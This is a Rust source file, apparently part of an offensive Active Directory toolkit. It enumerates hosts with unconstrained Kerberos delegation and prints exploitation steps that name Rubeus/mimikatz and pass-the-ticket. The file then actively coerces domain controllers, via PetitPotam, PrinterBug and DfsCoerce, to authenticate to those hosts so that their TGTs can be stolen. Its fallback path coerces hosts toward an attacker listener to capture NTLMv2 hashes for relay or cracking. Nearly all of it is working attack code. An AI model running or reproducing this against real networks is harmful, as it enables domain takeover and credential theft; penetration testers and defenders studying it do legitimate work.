//! Unconstrained Delegation discovery — Enumerate computers and users
//! with TRUSTED_FOR_DELEGATION that cache forwarded TGTs in memory.
//!
//! These hosts store TGTs of any user who authenticates to them,
//! making them high-value targets for credential theft.

use crate::coerce::{self, CoerceConfig, CoerceMethod};
use crate::runner::HuntConfig;
use colored::Colorize;
use overthrone_core::error::Result;
use overthrone_core::proto::ldap;
use serde::{Deserialize, Serialize};
use tracing::{info, warn};

// ═══════════════════════════════════════════════════════════
// UAC flag for unconstrained delegation
// ═══════════════════════════════════════════════════════════

/// TRUSTED_FOR_DELEGATION — unconstrained delegation (stores TGTs)
#[allow(dead_code)] // Protocol reference UAC flag
const UAC_TRUSTED_FOR_DELEGATION: u32 = 0x00080000;
/// Account is disabled
#[allow(dead_code)] // Protocol reference UAC flag
const UAC_ACCOUNT_DISABLE: u32 = 0x00000002;
/// Server trust account (domain controller)
#[allow(dead_code)] // Protocol reference UAC flag
const UAC_SERVER_TRUST_ACCOUNT: u32 = 0x00002000;

// ═══════════════════════════════════════════════════════════
// Configuration
// ═══════════════════════════════════════════════════════════

#[derive(Debug, Clone, Default)]
pub struct UnconstrainedConfig {
    /// Include domain controllers in results (they always have this flag)
    pub include_dcs: bool,
    /// Check if target hosts are reachable (SMB port probe)
    pub check_reachability: bool,
    /// Filter to specific OUs
    pub target_ous: Vec<String>,
}

// ═══════════════════════════════════════════════════════════
// Result
// ═══════════════════════════════════════════════════════════

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UnconstrainedResult {
    pub vulnerable_hosts: Vec<UnconstrainedHost>,
    pub domain_controllers: Vec<UnconstrainedHost>,
    pub total_checked: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UnconstrainedHost {
    pub sam_account_name: String,
    pub distinguished_name: String,
    pub dns_hostname: Option<String>,
    pub operating_system: Option<String>,
    pub is_domain_controller: bool,
    pub is_reachable: Option<bool>,
    pub spns: Vec<String>,
}

// ═══════════════════════════════════════════════════════════
// Reachability Check
// ═══════════════════════════════════════════════════════════

/// Check if a host is reachable on SMB port
async fn check_host_reachable(hostname: &str) -> bool {
    let addr = format!("{hostname}:445");
    matches!(
        tokio::time::timeout(
            tokio::time::Duration::from_secs(3),
            tokio::net::TcpStream::connect(&addr),
        )
        .await,
        Ok(Ok(_))
    )
}

// ═══════════════════════════════════════════════════════════
// Public Runner
// ═══════════════════════════════════════════════════════════

pub async fn run(config: &HuntConfig, uc: &UnconstrainedConfig) -> Result<UnconstrainedResult> {
    info!("{}", "═══ UNCONSTRAINED DELEGATION ═══".bold().red());

    let mut conn = if config.use_hash {
        ldap::LdapSession::connect_with_hash(
            &config.dc_ip,
            &config.domain,
            &config.username,
            &config.secret,
            config.use_ldaps,
        )
        .await?
    } else {
        ldap::LdapSession::connect(
            &config.dc_ip,
            &config.domain,
            &config.username,
            &config.secret,
            config.use_ldaps,
        )
        .await?
    };

    // Use the high-level API instead of raw search
    let ad_computers = conn.find_unconstrained_delegation().await?;
    let total_checked = ad_computers.len();

    let mut vulnerable_hosts = Vec::new();
    let mut domain_controllers = Vec::new();

    for comp in &ad_computers {
        let is_dc = (comp.user_account_control & UAC_SERVER_TRUST_ACCOUNT) != 0;

        // Optional reachability check
        let is_reachable = if uc.check_reachability {
            if let Some(hostname) = &comp.dns_hostname {
                Some(check_host_reachable(hostname).await)
            } else {
                Some(false)
            }
        } else {
            None
        };

        let host = UnconstrainedHost {
            sam_account_name: comp.sam_account_name.clone(),
            distinguished_name: comp.distinguished_name.clone(),
            dns_hostname: comp.dns_hostname.clone(),
            operating_system: comp.operating_system.clone(),
            is_domain_controller: is_dc,
            is_reachable,
            spns: comp.service_principal_names.clone(),
        };

        let reachable_icon = match is_reachable {
            Some(true) => " [REACHABLE]".green().to_string(),
            Some(false) => " [UNREACHABLE]".red().to_string(),
            None => String::new(),
        };

        if is_dc {
            info!(
                " {} {} (DC) — {}{}",
                "◆".dimmed(),
                comp.sam_account_name.dimmed(),
                comp.operating_system
                    .as_deref()
                    .unwrap_or("unknown OS")
                    .dimmed(),
                reachable_icon
            );
            domain_controllers.push(host.clone());
            // When include_dcs is set, also add DCs to the vulnerable_hosts list
            if uc.include_dcs {
                vulnerable_hosts.push(host);
            }
        } else {
            info!(
                " {} {} — {}{}{}",
                "⚠".red().bold(),
                comp.sam_account_name.bold().red(),
                comp.dns_hostname
                    .as_deref()
                    .unwrap_or(&comp.sam_account_name)
                    .yellow(),
                format!(" ({})", comp.operating_system.as_deref().unwrap_or("?")).dimmed(),
                reachable_icon
            );
            vulnerable_hosts.push(host);
        }
    }

    conn.disconnect().await?;

    // Print exploitation guidance
    if !vulnerable_hosts.is_empty() {
        info!("");
        info!("{}", "  Exploitation guidance:".bold());
        info!("  1. Compromise one of the unconstrained delegation hosts above");
        info!("  2. Use Rubeus/mimikatz to monitor for incoming TGTs");
        info!("  3. Coerce a high-value target (e.g., DC) to authenticate to the host");
        info!("  4. Extract the cached TGT and pass-the-ticket");
        info!("");
    }

    info!(
        "Unconstrained: {} non-DC hosts, {} DCs",
        vulnerable_hosts.len().to_string().red().bold(),
        domain_controllers.len()
    );

    Ok(UnconstrainedResult {
        vulnerable_hosts,
        domain_controllers,
        total_checked,
    })
}

// ═══════════════════════════════════════════════════════════
// Exploitation — coerce high-value hosts toward unconstrained targets
// ═══════════════════════════════════════════════════════════

/// Configuration for the active exploitation phase.
#[derive(Debug, Clone)]
pub struct ExploitUnconstrainedConfig {
    /// Our listener IP/hostname to receive coerced auth when no unconstrained
    /// host is available as an intermediate (fallback mode).
    pub listener: String,
    /// Listener port for the fallback path (default 445).
    pub listener_port: u16,
    /// When `true`, coerce each discovered DC to authenticate toward every
    /// reachable unconstrained delegation host (preferred path — caches the
    /// DC's TGT on the unconstrained host for later extraction).
    pub coerce_dcs_to_unconstrained: bool,
}

impl Default for ExploitUnconstrainedConfig {
    fn default() -> Self {
        Self {
            listener: String::new(),
            listener_port: 445,
            coerce_dcs_to_unconstrained: true,
        }
    }
}

/// Summary of the exploitation phase.
#[derive(Debug, Clone)]
pub struct ExploitUnconstrainedResult {
    pub coercions_attempted: usize,
    pub coercions_succeeded: usize,
}

/// Active exploitation of unconstrained delegation hosts.
///
/// Two paths are available depending on configuration:
///
/// **Preferred** (`coerce_dcs_to_unconstrained = true`): for each pair of
/// (reachable unconstrained host, DC), trigger coercion from the DC toward
/// the unconstrained host.  The DC will authenticate to the unconstrained
/// host, whose Kerberos stack caches the DC's forwarded TGT.
///
/// **Fallback**: when no unconstrained hosts are reachable, coerce each
/// discovered unconstrained host toward our own listener, capturing machine
/// NTLMv2 hashes for offline cracking or relay.
pub async fn exploit_unconstrained(
    config: &HuntConfig,
    uc_result: &UnconstrainedResult,
    exploit_cfg: &ExploitUnconstrainedConfig,
) -> Result<ExploitUnconstrainedResult> {
    info!(
        "{}",
        "═══ UNCONSTRAINED DELEGATION EXPLOIT ═══".bold().red()
    );

    let reachable: Vec<&UnconstrainedHost> = uc_result
        .vulnerable_hosts
        .iter()
        .filter(|h| h.is_reachable == Some(true))
        .collect();

    let mut coercions_attempted = 0usize;
    let mut coercions_succeeded = 0usize;

    if exploit_cfg.coerce_dcs_to_unconstrained && !reachable.is_empty() {
        // Preferred path: coerce each DC → each reachable unconstrained host.
        // The DC's TGT lands in the unconstrained host's LSASS for extraction.
        for uc_host in &reachable {
            let listener_host = uc_host
                .dns_hostname
                .as_deref()
                .unwrap_or(&uc_host.sam_account_name)
                .to_string();

            for dc in &uc_result.domain_controllers {
                let dc_target = dc
                    .dns_hostname
                    .as_deref()
                    .unwrap_or(&dc.sam_account_name)
                    .to_string();

                info!(
                    "  Coercing DC {} → unconstrained host {}",
                    dc_target.bold(),
                    listener_host.yellow()
                );

                let cc = CoerceConfig {
                    target: dc_target.clone(),
                    listener: listener_host.clone(),
                    listener_port: 445,
                    methods: vec![
                        CoerceMethod::PetitPotam,
                        CoerceMethod::PrinterBug,
                        CoerceMethod::DfsCoerce,
                    ],
                    listener_path: None,
                };

                coercions_attempted += 1;
                match coerce::run(config, &cc).await {
                    Ok(result) if !result.successful_coercions.is_empty() => {
                        coercions_succeeded += 1;
                        info!(
                            "  {} DC {} coerced → {} ({} method(s))",
                            "★".green().bold(),
                            dc_target,
                            listener_host,
                            result.successful_coercions.len()
                        );
                    }
                    Ok(_) => {
                        info!(
                            "  DC {} — no successful coercion methods",
                            dc_target.dimmed()
                        );
                    }
                    Err(e) => {
                        warn!("  Coercion of DC {} failed: {}", dc_target, e);
                    }
                }
            }
        }
    } else if !exploit_cfg.listener.is_empty() {
        // Fallback path: coerce unconstrained hosts toward our own listener.
        // Captures machine NTLMv2 for relay/cracking.
        for uc_host in uc_result
            .vulnerable_hosts
            .iter()
            .chain(uc_result.domain_controllers.iter())
        {
            let target = uc_host
                .dns_hostname
                .as_deref()
                .unwrap_or(&uc_host.sam_account_name)
                .to_string();

            info!(
                "  Coercing {} → listener {}",
                target.bold(),
                exploit_cfg.listener.yellow()
            );

            let cc = CoerceConfig {
                target: target.clone(),
                listener: exploit_cfg.listener.clone(),
                listener_port: exploit_cfg.listener_port,
                methods: vec![
                    CoerceMethod::PetitPotam,
                    CoerceMethod::PrinterBug,
                    CoerceMethod::DfsCoerce,
                ],
                listener_path: None,
            };

            coercions_attempted += 1;
            match coerce::run(config, &cc).await {
                Ok(result) if !result.successful_coercions.is_empty() => {
                    coercions_succeeded += 1;
                    info!(
                        "  {} {} coerced ({} method(s))",
                        "★".green().bold(),
                        target,
                        result.successful_coercions.len()
                    );
                }
                Ok(_) => {}
                Err(e) => {
                    warn!("  Coercion of {} failed: {}", target, e);
                }
            }
        }
    } else {
        info!("  No reachable unconstrained hosts and no fallback listener configured — skip");
    }

    info!(
        "Exploit result: {}/{} coercions succeeded",
        coercions_succeeded.to_string().green().bold(),
        coercions_attempted
    );

    Ok(ExploitUnconstrainedResult {
        coercions_attempted,
        coercions_succeeded,
    })
}
